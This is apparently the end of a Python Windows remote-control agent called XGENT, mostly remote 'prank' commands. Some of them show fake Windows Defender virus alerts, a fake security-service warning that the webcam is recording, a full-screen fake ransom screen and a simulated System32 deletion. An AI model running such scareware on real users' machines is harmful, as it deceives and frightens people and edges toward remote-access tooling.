        self._publish_response("output", {"type": "prank_type_reversed", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_volume_jump(self, payload: dict) -> None:
        """Скачки громкости (100% <-> 10%) с автовосстановлением."""
        def _jump():
            try:
                volume = self._get_master_volume()
                orig = volume.GetMasterVolumeLevelScalar()
                for _ in range(4):
                    volume.SetMasterVolumeLevelScalar(1.0, None)
                    time.sleep(0.3)
                    volume.SetMasterVolumeLevelScalar(0.1, None)
                    time.sleep(0.3)
                volume.SetMasterVolumeLevelScalar(orig, None)
            except Exception:
                pass
        threading.Thread(target=_jump, daemon=True).start()
        self._publish_response("output", {"type": "prank_volume_jump", "device_id": DEVICE_ID, "ok": True, "text": "🔊 Скачки громкости (100% <-> 10%) запущены!"})

    def _do_prank_say_whisper(self, payload: dict) -> None:
        """Медленный шепчущий голос через TTS."""
        phrase = payload.get("text") or "Обернись... Ты здесь совсем не один..."
        def _speak():
            try:
                import pyttsx3
                engine = pyttsx3.init()
                engine.setProperty("rate", 90)
                engine.setProperty("volume", 0.7)
                engine.say(phrase)
                engine.runAndWait()
            except Exception:
                pass
        threading.Thread(target=_speak, daemon=True).start()
        self._publish_response("output", {"type": "prank_say_whisper", "device_id": DEVICE_ID, "ok": True, "text": f"🗣️ Шёпот воспроизведён: '{phrase}'"})

    def _do_prank_fake_virus(self, payload: dict) -> None:
        """Серия шуточных предупреждений об опасном вирусе."""
        def _alerts():
            user32 = ctypes.windll.user32
            user32.MessageBoxW(None, "Обнаружен критический троян: Win32.Pivko.Trojan!\nВсе запасы пива под угрозой.", "Windows Defender Security Alert", 0x10)
            time.sleep(0.4)
            user32.MessageBoxW(None, "Попытка нейтрализации...\nОшибка: Троян слишком весёлый.", "Windows Defender", 0x30)
            time.sleep(0.4)
            user32.MessageBoxW(None, "Шутка! Ваша система в полной безопасности. 😉", "XGENT Prank", 0x40)
        threading.Thread(target=_alerts, daemon=True).start()
        self._publish_response("output", {"type": "prank_fake_virus", "device_id": DEVICE_ID, "ok": True, "text": "🦠 Шуточные предупреждения о вирусе показаны пользователю!"})

    def _do_prank_open_cd(self, payload: dict) -> None:
        """Открытие лотка CD-ROM дисковода или звуковой сигнал."""
        try:
            winmm = ctypes.windll.winmm
            winmm.mciSendStringW("set cdaudio door open", None, 0, None)
            text = "💿 Команда открытия CD-ROM отправлена!"
            ok = True
        except Exception as exc:
            winsound.Beep(800, 400)
            text = f"💿 CD-ROM физически не обнаружен (подан звуковой сигнал): {exc}"
            ok = True
        self._publish_response("output", {"type": "prank_open_cd", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_change_wallpaper(self, payload: dict) -> None:
        """Установка шуточных обоев с сохранением резервной копии."""
        try:
            key_path = r"Control Panel\Desktop"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ) as key:
                cur_wall, _ = winreg.QueryValueEx(key, "WallPaper")
                with open(CONFIG_DIR / "backup_wallpaper.txt", "w", encoding="utf-8") as bf:
                    bf.write(cur_wall)
            from PIL import Image, ImageDraw
            img = Image.new("RGB", (1920, 1080), color=(15, 20, 35))
            draw = ImageDraw.Draw(img)
            draw.text((650, 520), "HACKED BY XGENT :)\n(Все ваши печеньки принадлежат нам)", fill=(0, 255, 120))
            wall_path = CONFIG_DIR / "prank_wall.bmp"
            img.save(wall_path, "BMP")
            ctypes.windll.user32.SystemParametersInfoW(20, 0, str(wall_path), 3)
            text = "🖼️ Мемные обои установлены (исходные сохранены для восстановления)!"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка установки обоев: {exc}"
            ok = False
        self._publish_response("output", {"type": "prank_change_wallpaper", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_restore_wallpaper(self, payload: dict) -> None:
        """Восстановление исходных обоев рабочего стола."""
        try:
            bf_path = CONFIG_DIR / "backup_wallpaper.txt"
            if bf_path.exists():
                with open(bf_path, "r", encoding="utf-8") as bf:
                    orig_wall = bf.read().strip()
                if orig_wall and os.path.exists(orig_wall):
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, orig_wall, 3)
                    text = f"✅ Исходные обои успешно восстановлены:\n{orig_wall}"
                    ok = True
                else:
                    text = "ℹ️ Исходный файл обоев не найден на диске."
                    ok = False
            else:
                text = "ℹ️ Резервная копия обоев не найдена."
                ok = False
        except Exception as exc:
            text = f"⚠️ Ошибка восстановления обоев: {exc}"
            ok = False
        self._publish_response("output", {"type": "prank_restore_wallpaper", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_speak_time(self, payload: dict) -> None:
        """Озвучивание точного времени говорящим синтезатором речи."""
        now = time.strftime("%H часов %M минут")
        phrase = f"Внимание! Точное время на вашей планете: {now}. Не забудьте сделать разминку!"
        def _speak():
            try:
                import pyttsx3
                engine = pyttsx3.init()
                engine.setProperty("rate", 140)
                engine.say(phrase)
                engine.runAndWait()
            except Exception:
                pass
        threading.Thread(target=_speak, daemon=True).start()
        self._publish_response("output", {"type": "prank_speak_time", "device_id": DEVICE_ID, "ok": True, "text": f"🗣️ Время озвучено: '{phrase}'"})

    def _do_prank_rickroll_terminal(self, payload: dict) -> None:
        """Запуск терминала с ASCII анимацией / рикроллом."""
        try:
            subprocess.Popen(["start", "cmd", "/k", "curl -s parrot.live || curl -s ascii.live/rick"], shell=True)
            text = "🕺 Терминал с ASCII анимацией запущен на экране!"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка запуска терминала: {exc}"
            ok = False
        self._publish_response("output", {"type": "prank_rickroll_terminal", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_screen_off_brief(self, payload: dict) -> None:
        """Кратковременное погасание экрана на 3 секунды."""
        def _dark():
            user32 = ctypes.windll.user32
            user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
            time.sleep(3)
            user32.mouse_event(0x0001, 1, 1, 0, 0)
        threading.Thread(target=_dark, daemon=True).start()
        self._publish_response("output", {"type": "prank_screen_off_brief", "device_id": DEVICE_ID, "ok": True, "text": "🌑 Экран временно погашен на 3 секунды!"})

    def _do_prank_alert_loop(self, payload: dict) -> None:
        """Цепочка из 3 забавных диалоговых окон."""
        def _loop():
            user32 = ctypes.windll.user32
            user32.MessageBoxW(None, "Хотите ли вы удалить Интернет для освобождения памяти?", "Система Windows", 0x24)
            time.sleep(0.3)
            user32.MessageBoxW(None, "Вы уверены? Это действие невозможно отменить!", "Система Windows", 0x34)
            time.sleep(0.3)
            user32.MessageBoxW(None, "Отмена операции: Интернет слишком тяжелый.", "Система Windows", 0x40)
        threading.Thread(target=_loop, daemon=True).start()
        self._publish_response("output", {"type": "prank_alert_loop", "device_id": DEVICE_ID, "ok": True, "text": "❓ Шуточная цепочка диалоговых окон показана пользователю!"})

    def _do_prank_open_browser_memes(self, payload: dict) -> None:
        """Открытие 3 вкладок с легендарными мемами в браузере."""
        try:
            urls = [
                "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
                "https://cat-bounce.com/",
                "https://heeeeeeeey.com/",
            ]
            for u in urls:
                webbrowser.open_new_tab(u)
                time.sleep(0.3)
            text = "🌐 3 вкладки с легендарными мемами открыты в браузере!"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка браузера: {exc}"
            ok = False
        self._publish_response("output", {"type": "prank_open_browser_memes", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_glitch_cursor(self, payload: dict) -> None:
        """Курсор рисует 'восьмёрку' в течение 5 секунд."""
        def _glitch():
            user32 = ctypes.windll.user32
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
            pt = POINT()
            user32.GetCursorPos(ctypes.byref(pt))
            cx, cy = pt.x, pt.y
            for i in range(50):
                angle = i * 0.25
                x = int(cx + 100 * math.sin(angle))
                y = int(cy + 60 * math.sin(angle * 2))
                user32.SetCursorPos(x, y)
                time.sleep(0.1)
        threading.Thread(target=_glitch, daemon=True).start()
        self._publish_response("output", {"type": "prank_glitch_cursor", "device_id": DEVICE_ID, "ok": True, "text": "🌀 Глючный курсор (траектория 'восьмёрка') кружится 5 секунд!"})

    def _do_prank_shake_window(self, payload: dict) -> None:
        """Тряска активного окна."""
        def _shake():
            user32 = ctypes.windll.user32
            class RECT(ctypes.Structure):
                _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long),
                            ("right", ctypes.c_long), ("bottom", ctypes.c_long)]
            hwnd = user32.GetForegroundWindow()
            if not hwnd:
                return
            rect = RECT()
            user32.GetWindowRect(hwnd, ctypes.byref(rect))
            x, y = rect.left, rect.top
            w = rect.right - rect.left
            h = rect.bottom - rect.top
            for i in range(24):
                dx = 20 if (i % 2 == 0) else -20
                user32.MoveWindow(hwnd, x + dx, y, w, h, True)
                time.sleep(0.06)
            user32.MoveWindow(hwnd, x, y, w, h, True)
        threading.Thread(target=_shake, daemon=True).start()
        self._publish_response("output", {"type": "prank_shake_window", "device_id": DEVICE_ID, "ok": True, "text": "🫨 Активное окно трясётся из стороны в сторону!"})

    def _do_prank_meme_wallpaper(self, payload: dict) -> None:
        """Скачать и установить случайный смешной мем в качестве обоев."""
        payload["random_meme"] = True
        self._do_wallpaper_set(payload)

    def _do_prank_caps_disco(self, payload: dict) -> None:
        """Дискотека индикаторами CapsLock/NumLock на клавиатуре."""
        def _disco():
            user32 = ctypes.windll.user32
            for _ in range(16):
                user32.keybd_event(0x14, 0, 0, 0)
                user32.keybd_event(0x14, 0, 2, 0)
                user32.keybd_event(0x90, 0, 0, 0)
                user32.keybd_event(0x90, 0, 2, 0)
                time.sleep(0.18)
        threading.Thread(target=_disco, daemon=True).start()
        self._publish_response("output", {"type": "prank_caps_disco", "device_id": DEVICE_ID, "ok": True, "text": "✨ Дискотека светодиодов клавиатуры запущена!"})

    def _do_prank_cursor_circle(self, payload: dict) -> None:
        """Круговые гипнотические движения курсора мыши."""
        def _circle():
            user32 = ctypes.windll.user32
            sw = user32.GetSystemMetrics(0)
            sh = user32.GetSystemMetrics(1)
            cx, cy = sw // 2, sh // 2
            r = min(sw, sh) // 3
            import math
            for step in range(80):
                angle = step * 0.15
                x = int(cx + r * math.cos(angle))
                y = int(cy + r * math.sin(angle))
                user32.SetCursorPos(x, y)
                time.sleep(0.05)
        threading.Thread(target=_circle, daemon=True).start()
        self._publish_response("output", {"type": "prank_cursor_circle", "device_id": DEVICE_ID, "ok": True, "text": "🌀 Курсор мыши закручен в гипнотический круг на 5 сек!"})

    def _do_prank_fake_error_spam(self, payload: dict) -> None:
        """Каскадный спам звуками критической ошибки Windows."""
        def _beep_spam():
            for _ in range(12):
                try:
                    import winsound
                    winsound.MessageBeep(0x00000010)
                except Exception:
                    pass
                time.sleep(0.18)
        threading.Thread(target=_beep_spam, daemon=True).start()
        self._publish_response("output", {"type": "prank_fake_error_spam", "device_id": DEVICE_ID, "ok": True, "text": "🚨 Спам звуками критической ошибки Windows запущен!"})

    def _do_prank_fake_delete_sys32(self, payload: dict) -> None:
        """Имитация удаления System32 в терминале."""
        try:
            cmd = (
                'start "System Integrity Service" cmd /k "'
                'color 0A & echo [CRITICAL] Deleting Windows system files... & timeout /t 1 >nul & '
                'dir /s C:\\Windows\\System32 & cls & color 0C & '
                'echo [FATAL ERROR] 14,291 system files permanently purged! & '
                'echo System will halt in 5 seconds... & timeout /t 4 >nul & '
                'color 0A & echo ============================================= & '
                'echo    JUST A PRANK BY XGENT! EVERYTHING IS SAFE :) & '
                'echo ============================================= & '
                'timeout /t 6 >nul & exit"'
            )
            subprocess.Popen(cmd, shell=True)
            ok, text = True, "💻 Фейковое удаление System32 запущено в терминале!"
        except Exception as exc:
            ok, text = False, f"⚠️ Ошибка: {exc}"
        self._publish_response("output", {"type": "prank_fake_delete_sys32", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_ghost_typer(self, payload: dict) -> None:
        """Печать призрачных фраз в активное окно."""
        def _ghost():
            time.sleep(1.0)
            phrases = [
                "   👻 Привет... Я живу в твоем кулере...   ",
                "   👀 Не оборачивайся... Сзади кто-то стоит...   ",
                "   👽 Твой ПК захвачен внеземным разумом...   ",
            ]
            text = random.choice(phrases)
            try:
                user32 = ctypes.windll.user32
                for ch in text:
                    code = ord(ch)
                    user32.keybd_event(0, code, 0x0004, 0)
                    user32.keybd_event(0, code, 0x0004 | 0x0002, 0)
                    time.sleep(0.06)
            except Exception as e:
                log.error("Ghost typer error: %s", e)
        threading.Thread(target=_ghost, daemon=True).start()
        self._publish_response("output", {"type": "prank_ghost_typer", "device_id": DEVICE_ID, "ok": True, "text": "👻 Призрачный набор текста активирован в активном окне!"})

    def _do_prank_fbi_lock(self, payload: dict) -> None:
        """Окно предупреждения от спецслужб."""
        def _fbi():
            msg = (
                "ВНИМАНИЕ! Ваш IP-адрес зафиксирован Федеральной Службой Безопасности.\n\n"
                "Зафиксирована подозрительная активность.\n"
                "Веб-камера и микрофон переведены в режим протоколирования доказательств.\n"
                "Оставайтесь на месте до прибытия оперативной группы."
            )
            ctypes.windll.user32.MessageBoxW(None, msg, "⚠️ ФЕДЕРАЛЬНОЕ ПРЕДУПРЕЖДЕНИЕ", 0x10 | 0x0)
        threading.Thread(target=_fbi, daemon=True).start()
        self._publish_response("output", {"type": "prank_fbi_lock", "device_id": DEVICE_ID, "ok": True, "text": "🚨 Предупреждение от спецслужб выведено на экран!"})

    def _do_prank_cat_invaders(self, payload: dict) -> None:
        """Открытие вкладок с котиками в браузере."""
        try:
            urls = [
                "https://cataas.com/cat/says/HELLO%20HUMAN",
                "https://cataas.com/cat/gif",
                "https://cataas.com/cat",
            ]
            for u in urls:
                webbrowser.open(u)
                time.sleep(0.3)
            ok, text = True, "🐱 Нашествие котиков открыто в браузере!"
        except Exception as exc:
            ok, text = False, f"⚠️ Ошибка: {exc}"
        self._publish_response("output", {"type": "prank_cat_invaders", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_fake_ransom_cats(self, payload: dict) -> None:
        """Полноэкранный шуточный вымогатель с котиками."""
        def _cat_screen():
            try:
                import tkinter as tk
                root = tk.Tk()
                root.title("RansomCat v1.0")
                root.attributes("-fullscreen", True)
                root.attributes("-topmost", True)
                root.configure(bg="#1A002C")
                root.bind("<Escape>", lambda e: root.destroy())
                root.bind("<Double-Button-1>", lambda e: root.destroy())

                frame = tk.Frame(root, bg="#1A002C")
                frame.place(relx=0.5, rely=0.5, anchor="center")

                tk.Label(frame, text="🐱 ВНИМАНИЕ! ВСЕ ВАШИ ФАЙЛЫ ЗАХВАЧЕНЫ КОТАМИ! 🐾", font=("Segoe UI", 26, "bold"), fg="#FF55FF", bg="#1A002C").pack(pady=15)
                msg = (
                    "Ваши файлы не зашифрованы, но котики очень голодны!\n"
                    "Для разблокировки положите 3 пакетика влажного корма перед монитором.\n\n"
                    "Осталось времени до того как кот скинет кружку со стола: 00:05:00\n"
                    "(Для закрытия нажмите клавишу ESC)"
                )
                tk.Label(frame, text=msg, font=("Segoe UI", 16), fg="white", bg="#1A002C", justify="center").pack(pady=20)
                root.after(18000, lambda: root.destroy())
                root.mainloop()
            except Exception as e:
                log.error("Cat ransom error: %s", e)
        threading.Thread(target=_cat_screen, daemon=True).start()
        self._publish_response("output", {"type": "prank_fake_ransom_cats", "device_id": DEVICE_ID, "ok": True, "text": "🐱 Кошачий экран-вымогатель выведен на весь экран!"})

    def _do_prank_nyan_stream(self, payload: dict) -> None:
        """Запуск Nyan Cat с радугой."""
        try:
            webbrowser.open("https://www.youtube.com/watch?v=QH2-TGUlwu4")
            ok, text = True, "🌈 Nyan Cat с радугой и музыкой запущен в браузере!"
        except Exception as exc:
            ok, text = False, f"⚠️ Ошибка: {exc}"
        self._publish_response("output", {"type": "prank_nyan_stream", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_random_beeps(self, payload: dict) -> None:
        """Случайные внезапные звуковые сигналы материнской платы."""
        def _beeps():
            for _ in range(8):
                try:
                    import winsound
                    freq = random.randint(500, 2200)
                    dur = random.randint(80, 250)
                    winsound.Beep(freq, dur)
                except Exception:
                    pass
                time.sleep(random.uniform(0.1, 0.4))
        threading.Thread(target=_beeps, daemon=True).start()
        self._publish_response("output", {"type": "prank_random_beeps", "device_id": DEVICE_ID, "ok": True, "text": "🔊 Серия случайных звуковых сигналов ПК запущена!"})

    def _do_prank_confetti_winner(self, payload: dict) -> None:
        """Праздничный экран «Вы выиграли миллион долларов»."""
        try:
            html = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>WINNER!</title>
<style>body{background:#FFD700;color:#8B0000;font-family:sans-serif;text-align:center;padding-top:100px;overflow:hidden;}
h1{font-size:55px;animation:blink 0.5s infinite alternate;}@keyframes blink{from{opacity:1;}to{opacity:0.3;}}
p{font-size:28px;font-weight:bold;}
</style></head><body><h1>🎉 ПОЗДРАВЛЯЕМ! ВЫ ВЫИГРАЛИ 1,000,000 $ ! 🎉</h1>
<p>Вы стали миллионным посетителем этого компьютера!<br>Деньги уже переводятся на ваш стол!</p>
<script>
let a=new AudioContext();
function b(){let o=a.createOscillator();o.connect(a.destination);o.frequency.value=800;o.start();setTimeout(()=>o.stop(),200);}
setInterval(b,600);
setTimeout(()=>window.close(),15000);
</script></body></html>"""
            tf = tempfile.NamedTemporaryFile("w", suffix=".html", delete=False, encoding="utf-8")
            tf.write(html)
            tf.close()
            subprocess.Popen(f'explorer "{tf.name}"', shell=True)
            ok, text = True, "🎰 Экран с выигрышем $1,000,000 открыт!"
        except Exception as exc:
            ok, text = False, f"⚠️ Ошибка: {exc}"
        self._publish_response("output", {"type": "prank_confetti_winner", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_low_battery_fake(self, payload: dict) -> None:
        """Ложное системное оповещение о критическом заряде батареи 0%."""
        def _bat():
            msg = "Уровень заряда батареи: 0%!\nКомпьютер будет выключен через 15 секунд для предотвращения потери данных."
            ctypes.windll.user32.MessageBoxW(None, msg, "Критический разряд аккумулятора", 0x30 | 0x0)
        threading.Thread(target=_bat, daemon=True).start()
        self._publish_response("output", {"type": "prank_low_battery_fake", "device_id": DEVICE_ID, "ok": True, "text": "🪫 Оповещение о 0% батареи показано на экране!"})

    def _do_prank_earthquake(self, payload: dict) -> None:
        """Землетрясение активного окна (вибрация 8.0 баллов)."""
        def _quake():
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            if not hwnd:
                return
            class RECT(ctypes.Structure):
                _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long), ("right", ctypes.c_long), ("bottom", ctypes.c_long)]
            r = RECT()
            if not user32.GetWindowRect(hwnd, ctypes.byref(r)):
                return
            w = r.right - r.left
            h = r.bottom - r.top
            orig_x, orig_y = r.left, r.top
            for _ in range(40):
                dx = random.randint(-25, 25)
                dy = random.randint(-25, 25)
                user32.MoveWindow(hwnd, orig_x + dx, orig_y + dy, w, h, True)
                time.sleep(0.04)
            user32.MoveWindow(hwnd, orig_x, orig_y, w, h, True)
        threading.Thread(target=_quake, daemon=True).start()
        self._publish_response("output", {"type": "prank_earthquake", "device_id": DEVICE_ID, "ok": True, "text": "🌋 Землетрясение активного окна запущено на 3 секунды!"})

    def _do_prank_laugh_track(self, payload: dict) -> None:
        """Зловещий закадровый смех через динамики."""
        def _laugh():
            try:
                import pyttsx3
                engine = pyttsx3.init()
                engine.setProperty("rate", 140)
                engine.setProperty("volume", 1.0)
                engine.say("Ха ха ха ха! Мва ха ха ха ха! Я контролирую этот компьютер!")
                engine.runAndWait()
            except Exception as e:
                log.error("Laugh track error: %s", e)
        threading.Thread(target=_laugh, daemon=True).start()
        self._publish_response("output", {"type": "prank_laugh_track", "device_id": DEVICE_ID, "ok": True, "text": "😈 Зловещий смех запущен через динамики!"})

    def _do_prank_stop_all(self, payload: dict) -> None:
        """Экстренная остановка всех активных приколов и возврат системы в нормальный штатный режим."""
        log.info("Экстренная остановка всех приколов (prank_stop_all)...")
        results = []
        # 1. Восстановить кнопки мыши
        try:
            ctypes.windll.user32.SwapMouseButton(0)
            results.append("кнопки мыши (L/R норма)")
        except Exception:
            pass
        # 2. Восстановить скорость мыши (стандарт 10)
        try:
            ctypes.windll.user32.SystemParametersInfoW(0x0071, 0, 10, 0)
            results.append("скорость мыши")
        except Exception:
            pass
        # 3. Вернуть иконки рабочего стола
        try:
            progman = ctypes.windll.user32.FindWindowW("Progman", None)
            def_view = ctypes.windll.user32.FindWindowExW(progman, None, "SHELLDLL_DefView", None)
            listview = ctypes.windll.user32.FindWindowExW(def_view, None, "SysListView32", None)
            if listview:
                ctypes.windll.user32.ShowWindow(listview, 5)  # SW_SHOW
                results.append("иконки стола")
        except Exception:
            pass
        # 4. Сбросить поворот экрана в 0°
        try:
            _rotate_screen(0)
            results.append("поворот экрана (0°)")
        except Exception:
            pass
        # 5. Восстановить обои если сохранены
        try:
            self._do_prank_restore_wallpaper({})
            results.append("обои")
        except Exception:
            pass
        # 6. Отключить ночной свет если был включен
        try:
            self._do_display_night_light({"enabled": False})
        except Exception:
            pass

        restored_str = ", ".join(results) if results else "эффекты сброшены"
        self._publish_response("output", {
            "type": "prank_stop_all",
            "device_id": DEVICE_ID,
            "ok": True,
            "text": f"🛑 Все приколы принудительно остановлены!\nВосстановлено: {restored_str}",
        })






    def _do_agent_update(self, payload: dict) -> None:
        """Проверка статуса обновления и перезапуск агента при необходимости."""
        restart = payload.get("restart", False)
        pid = os.getpid()
        exe_path = sys.executable
        text = (
            f"🔄 <b>Агент XGENT v1.3 (Актуален)</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• Платформа: Windows ({platform.system()} {platform.release()})\n"
            f"• Процесс: <code>{html.escape(exe_path)}</code>\n"
            f"• PID процесса: <code>{pid}</code>\n"
            f"• Набор команд: <b>{len(SUPPORTED_COMMANDS)} функций</b> (полная синхронизация)\n"
            f"• Статус: 🟢 В сети, готов к приёму команд"
        )
        if restart:
            text += "\n\n⚠️ <i>Инициирован перезапуск процесса агента...</i>"
            def _reboot_agent():
                time.sleep(1.5)
                subprocess.Popen([sys.executable] + sys.argv)
                os._exit(0)
            threading.Thread(target=_reboot_agent, daemon=True).start()
        self._publish_response("output", {"type": "agent_update", "device_id": DEVICE_ID, "ok": True, "text": text})

    def _do_uninstall_agent(self, payload: dict) -> None:
        """Полное удаление агента с ПК: автозапуск, конфиги, логи и завершение процесса."""
        log.warning("Получена команда полного удаления агента с ПК!")
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "XGentAgent")
            winreg.CloseKey(key)
        except Exception:
            pass

        try:
            startup_dir = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
            for shortcut in startup_dir.glob("*XGENT*"):
                shortcut.unlink(missing_ok=True)
        except Exception:
            pass

        try:
            import shutil
            if CONFIG_DIR.exists():
                shutil.rmtree(CONFIG_DIR, ignore_errors=True)
        except Exception:
            pass

        text = (
            "🛑 <b>Агент XGENT полностью удалён с компьютера!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "• Автозагрузка Windows очищена\n"
            "• Локальные настройки и логи удалены\n"
            "• Процесс агента завершает работу."
        )
        self._publish_response("output", {"type": "uninstall_agent", "device_id": DEVICE_ID, "ok": True, "text": text})

        def _bye():
            time.sleep(1.5)
            os._exit(0)
        threading.Thread(target=_bye, daemon=True).start()


def _detect_features() -> dict:
    """Безопасное обнаружение возможностей без доступа к оборудованию."""
    features = {
        "notify": True,
        "lock_screen": True,
        "power_control": True,
        "screenshot": False,
        "tts": False,
        "audio_control": False,
        "camera_api": False,
        "battery": False,
        "clipboard": False,
        "mic": False,
        "shell": True,
        "open_app": True,
    }
    try:
        from PIL import ImageGrab  # noqa: F401
        features["screenshot"] = True
    except Exception:
        pass
    try:
        import pyttsx3  # noqa: F401
        features["tts"] = True
    except Exception:
        pass
    try:
        import pycaw  # noqa: F401
        import comtypes  # noqa: F401
        features["audio_control"] = True
    except Exception:
        pass
    try:
        import cv2  # noqa: F401
        features["camera_api"] = True
    except Exception:
        pass
    try:
        features["battery"] = psutil.sensors_battery() is not None
    except Exception:
        pass
    try:
        import pyperclip  # noqa: F401
        features["clipboard"] = True
    except Exception:
        pass
    try:
        import sounddevice  # noqa: F401
        import soundfile  # noqa: F401
        features["mic"] = True
    except Exception:
        pass
    return features


def ctypes_windll_user32_message_box(text: str) -> None:
    """Обертка над MessageBoxW для тестируемости."""
    ctypes.windll.user32.MessageBoxW(None, text, "XGENT", 0x40)


def setup_logging() -> None:
    r"""Лог в %USERPROFILE%\.xgent\xgent.log (с ротацией) + консоль при наличии."""
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    handlers = [
        RotatingFileHandler(
            CONFIG_DIR / "xgent.log",
            maxBytes=500_000,
            backupCount=3,
            encoding="utf-8",
        )
    ]
    if "--console" in sys.argv:
        handlers.append(logging.StreamHandler(sys.stdout))
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
        handlers=handlers,
    )


def main() -> None:
    setup_logging()
    client = XgentClient()
    if "--console" in sys.argv or "--no-tray" in sys.argv:
        log.info("Запуск XGENT в консольном режиме")
        client.start()
        try:
            while client.is_running:
                time.sleep(1)
        finally:
            client.stop()
        return

    try:
        import pystray
        from pystray import Menu, MenuItem
    except ImportError:
        log.warning("pystray недоступен — запуск без значка в трее")
        client.start()
        try:
            while client.is_running:
                time.sleep(1)
        finally:
            client.stop()
        return

    icon = pystray.Icon(
        "xgent-wds",
        create_image(),
        "XGENT",
        menu=Menu(
            MenuItem("🟢 XGENT: онлайн", None, enabled=False),
            Menu.SEPARATOR,
            MenuItem("Остановить XGENT", lambda *_: client.request_stop()),
        ),
    )
    client.on_stop_requested = icon.stop
    client.start()
    icon.run()
    client.stop()


if __name__ == "__main__":
    main()
